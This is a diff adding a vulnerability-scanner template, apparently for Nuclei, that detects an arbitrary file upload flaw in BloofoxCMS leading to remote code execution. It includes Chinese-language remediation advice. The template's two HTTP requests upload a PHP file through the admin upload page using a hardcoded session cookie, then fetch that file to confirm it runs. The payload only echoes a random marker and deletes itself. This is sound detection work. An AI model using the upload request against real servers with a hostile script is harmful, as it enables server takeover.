@@ -1,0 +1,55 @@
+id: bloofoxcms-arbitrary-file-upload-rce
+
+info:
+  name: BloofoxCMS 任意文件上传致远程代码执行漏洞
+  author: zzgslh
+  severity: high
+  description: |
+    BloofoxCMS 未对上传文件类型进行充分校验，攻击者可借助该缺陷上传恶意 PHP 脚本，进而在目标服务器上实现远程代码执行。
+  reference:
+    - https://blog.csdn.net/zzgslh/article/details/112306611
+  tags: bloofoxCMS
+  remediation: >-
+    升级到已修复版本，仅允许业务必需的文件类型，校验文件实际内容而不能只检查扩展名；将上传文件存放在 Web 根目录之外并使用随机生成的文件名，禁止上传目录执行脚本，同时限制文件大小和访问权限。
+  
+variables:
+  rboundary: "{{to_lower(rand_base(29))}}"
+  r1: "{{to_lower(rand_base(8))}}"
+  r2: "{{to_lower(rand_base(12))}}"
+  sid: "4hhpoakdq7rdtsv9gvplo5bui0"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /admin/index.php?mode=tools&page=upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------{{rboundary}}
+        Cookie: sid={{sid}}
+
+        -----------------------------{{rboundary}}
+        Content-Disposition: form-data; name="dir"
+
+        ../media/images/
+        -----------------------------{{rboundary}}
+        Content-Disposition: form-data; name="file1"; filename="{{r1}}.php"
+
+        <?php echo "{{r2}}"; unlink(__FILE__); ?>
+        -----------------------------{{rboundary}}
+        Content-Disposition: form-data; name="send"
+
+        Upload File(s)
+        -----------------------------{{rboundary}}
+  - raw:
+      - |
+        GET /media/images/{{r1}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: sid={{sid}}
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "{{r2}}")'
+          - 'status_code_2 == 200'
+        condition: and
